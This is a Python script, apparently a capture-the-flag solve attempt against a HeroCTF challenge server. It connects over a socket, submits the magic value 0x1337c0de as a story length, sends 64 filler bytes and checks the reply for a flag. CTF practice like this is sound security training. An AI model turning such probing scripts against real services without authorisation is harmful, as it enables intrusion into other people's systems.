#!/usr/bin/env python3
import socket
import time

# Probar con el valor mágico como string decimal
magic_val = 0x1337c0de
print(f"Magic value: {magic_val} (0x{magic_val:x})")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect(('dyn06.heroctf.fr', 13683))

def recv_until(s, text, max_bytes=4096):
    data = b''
    count = 0
    while text not in data and count < max_bytes:
        try:
            chunk = s.recv(1024)
            if not chunk:
                break
            data += chunk
            count += len(chunk)
        except socket.timeout:
            break
    return data.decode('utf-8', errors='ignore')

try:
    recv_until(s, b'> ', 500)
    
    # Opción 1: Submit story
    s.send(b'1\n')
    recv_until(s, b': ', 500)
    
    # Longitud con el valor mágico
    s.send(f'{magic_val}\n'.encode())
    response = recv_until(s, b': ', 1000)
    print("Length response:", response[:200])
    
    if 'Now type' in response:
        # Enviar historia
        story = "A" * 64
        s.send(story.encode() + b'\n')
        time.sleep(1)
        recv_until(s, b'> ', 2000)
        
        # Ver resultados
        s.send(b'4\n')
        time.sleep(1)
        results = recv_until(s, b'> ', 2000)
        print("\nRESULTS:", results)
        
        if 'Hero{' in results:
            print("\n*** FLAG FOUND ***")
    
except Exception as e:
    print(f"Error: {e}")
finally:
    s.close()
